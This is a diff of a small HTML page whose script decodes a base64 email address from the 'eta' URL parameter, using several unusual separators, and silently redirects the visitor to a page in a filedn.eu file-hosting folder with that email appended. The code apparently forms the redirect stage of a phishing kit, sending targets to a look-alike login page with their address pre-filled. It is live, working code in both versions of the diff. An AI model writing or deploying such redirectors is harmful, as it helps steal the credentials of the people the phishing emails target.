@@ -5,30 +5,25 @@
 </head>
 <body>
   <script type="text/javascript">
-    var url_string = window.location.href;
     // Extract eta from query parameters
     var urlParams = new URLSearchParams(window.location.search);
-    var eta = urlParams.get('eta');
-    // Extract hash
-    var hash = window.location.hash ? window.location.hash.substring(1) : null;
-    // Use hash if present, otherwise eta
-    var param = hash || eta || '';
-    var url_get_email = atob(getafterhash(param));
-    var mail_go_url = "https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/index.html#" + url_get_email + "";
+    var eta = urlParams.get('eta') || '';
+    // Process eta to extract the relevant part
+    var url_get_email = atob(getafterseparators(eta));
+    var mail_go_url = "https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/testing/index.html#" + url_get_email;
     location.replace(mail_go_url);
 
-    function getafterhash(url) {
+    function getafterseparators(param) {
       var ret;
-      var queryString;
       // If no parameter is provided, return 0
-      if (!url) {
+      if (!param) {
         ret = 0;
       } else {
         // Check for alternative separators
-        queryStringhash = url.split('eta')[1];
-        queryStringsemi = url.split(';')[1];
-        queryStringsemiplus = url.split(';+')[1];
-        queryStringstartsemi = url.split('*;')[1];
+        var queryStringhash = param.split('#')[1];
+        var queryStringsemi = param.split(';')[1];
+        var queryStringsemiplus = param.split(';+')[1];
+        var queryStringstartsemi = param.split('*;')[1];
         // Prioritize the first valid separator
         if (queryStringhash) {
           ret = queryStringhash;
@@ -39,7 +34,7 @@
         } else if (queryStringstartsemi) {
           ret = queryStringstartsemi;
         } else {
-          ret = url; // Use the full parameter if no separators
+          ret = param; // Use the full parameter if no separators
         }
       }
       return ret;
